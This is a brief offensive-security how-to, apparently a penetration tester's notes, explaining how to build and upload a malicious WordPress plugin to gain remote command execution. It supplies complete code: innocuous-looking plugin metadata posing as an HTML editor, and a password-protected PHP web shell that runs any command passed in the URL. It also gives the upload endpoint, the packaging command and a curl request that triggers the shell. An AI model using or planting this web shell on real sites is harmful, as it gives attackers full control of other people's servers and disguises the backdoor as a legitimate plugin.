# Malicious Wordpress Plugin

## About

This document describes the procedure for creating a malicious plugin you can upload on **Wordpress** instances in order to obtain *Remote Command Execution*.

## How-to

The first step is to create a folder containing a file with the same name of the folder. In my case, I used something apparently innocuous:

```txt
SimpleHTMLEditor
└── SimpleHTMLEditor.php
```

The `PHP` file should containing the following metadata at the beginning:

```php
<?php
/**
 * Plugin Name: SimpleHTMLEditor
 * Plugin URI: https://rbct.it
 * Description: Jus a simple HTML editor
 * Version: 1.0
 * Author: rbct
 * Author URI: https://rbct.it
 */
```

After that, you're free to place whatever malicious code you want to execute. I decided to use a simple web shell:

```php
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    if (isset($_GET['cmd']) && isset($_GET['pwd']))
    {
        if ($_GET['pwd'] === "7be293360ddf3cc13a0153d7a88f677d")
        {
            system($_GET['cmd']);
        }
    }
}
?>
```

You can upload the plugin visiting the following *endpoint*:

```txt
/wp-admin/plugin-install.php
```

However, in order to upload it, you need a `ZIP` package. You can prepare it by running the command below:

```bash
zip -r SimpleHTMLEditor.zip SimpleHTMLEditor
```

After you upload it, you also have to **activate** the plugin.

Finally, providing the required parameters, you'll be able to execute the `PHP` script and obtain *Remote Command Execution* on the host:

```bash
curl 'http://sandbox.local/wp-content/plugins/SimpleHTMLEditor/SimpleHTMLEditor.php?pwd=7be293360ddf3cc13a0153d7a88f677d&cmd=whoami'
```

## Author

[Robert C. Raducioiu](https://www.linkedin.com/in/rbct/) ([rbct](https://rbct.it/))
